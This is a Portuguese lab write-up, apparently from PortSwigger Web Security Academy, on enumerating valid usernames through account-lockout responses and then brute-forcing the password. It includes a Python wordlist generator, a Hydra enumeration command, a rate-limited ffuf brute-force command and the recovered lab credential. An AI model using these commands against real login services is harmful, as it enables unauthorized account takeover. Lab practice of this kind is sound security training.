## Objetivo
Enumeração de usuário valido via bloqueio de conta. Após isso fazer o brute force da senha

## Vulnerabilidade Identificada
O servidor bloqueia o usuário valido após 5 tentativas com uma senha incorreta. assim facilitando a enumeração de credenciais valida. 
e também após 5 tentativas o servidor bloqueia por 1 minuto a conta e desbloqueia. dando um limite rate facil de bypass facilitando a brute automatizada

## Comandos Utilizados
Primeiro eu criei um script python pra repetir 5 vezes cada user e coloquei uma senha errada de proprosito. assim criando a wordlist pra usar no hydra para a enumeração
```python
with open('/home/luweed/Documents/wordusers.txt') as f:
    users = f.readlines()
    
with open('/home/luweed/Documents/multiplicada.txt', 'w') as f:
    for user in users:
        user = user.strip()
        for _ in range(5):
            f.write(f'{user}:senhawrong\n')
```

Após criar a wordlist, usei Hydra com F=Invalid username or password. 
quando o username era válido e a conta bloqueou, o servidor retornou mensagem diferente que não continha essa string, então o Hydra confirmou o usuário valido
```bash
hydra -C /home/luweed/Documents/multiplicada.txt \
0a6500af037d042b821370bf0056001c.web-security-academy.net \
https-post-form \
"/login:username=^USER^&password=^PASS^:F=Invalid username or password."

```

Após achar o usuário, usei ffuf para fazer a brute force respeitando o rate limit de bloqueio 
```bash
     ffuf -w /home/luweed/Documents/rockpass.txt:FUZZ \
     -u https://0a6500af037d042b821370bf0056001c.web-security-academy.net/login \
     -X POST \
     -d "username=applications&password=FUZZ" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -fc 200 \
     -t 1 \
     -p 15
```



## Resultado
applications:shadow

## Lições Aprendidas
Em um ataque real, essa técnica poderia comprometer muitas contas simultaneamente, 
tornando o account locking uma mitigação ineficaz sem mecanismos adicionais como CAPTCHA ou lockout permanente.

